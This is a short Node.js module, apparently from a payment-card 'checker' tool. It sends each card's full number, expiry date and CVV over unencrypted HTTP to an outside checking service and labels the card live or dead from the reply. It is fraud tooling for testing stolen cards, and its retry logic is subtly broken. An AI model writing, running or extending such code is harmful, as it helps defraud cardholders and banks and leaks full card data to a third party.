const request = require('request-promise')

const { getConfig } = require('../../configManager')

module.exports = async function warlock(card, currentRetry = 0) {
  const { retrys, warlock: configs } = getConfig('checkers')
  const returns = {
    live: (isLive, resp) => ({
      card,
      active: true,
      output: resp,
      live: isLive,
    }),
    skip: (resp) => ({
      card,
      active: true,
      output: resp,
      live: false,
      skip: true,
    }),
  }

  const options = {
    url: `http://ccheckmate.com:8087/checker/${configs.tester}?token=${configs.token}&cc=${card.number}|${card.month}|${card.year}|${card.cvv}`,
    method: 'GET',
    timeout: 100000,
  }

  const callApi = await request(options).catch((error) =>
    JSON.stringify({
      error: typeof error.error != Object ? error.error : error.error,
      message: error?.message ?? error.error,
    })
  )

  const response = JSON.parse(callApi)

  console.log(response)

  if (response.error) {
    if (currentRetry >= retrys) {
      return returns.skip(response)
    }
    return currentRetry++ && warlock(card, currentRetry)
  }

  if (response.status == 1) {
    return returns.live(true, response)
  } else if ([2].includes(response.status)) {
    return returns.live(false, response)
  }

  return returns.skip(response)
}
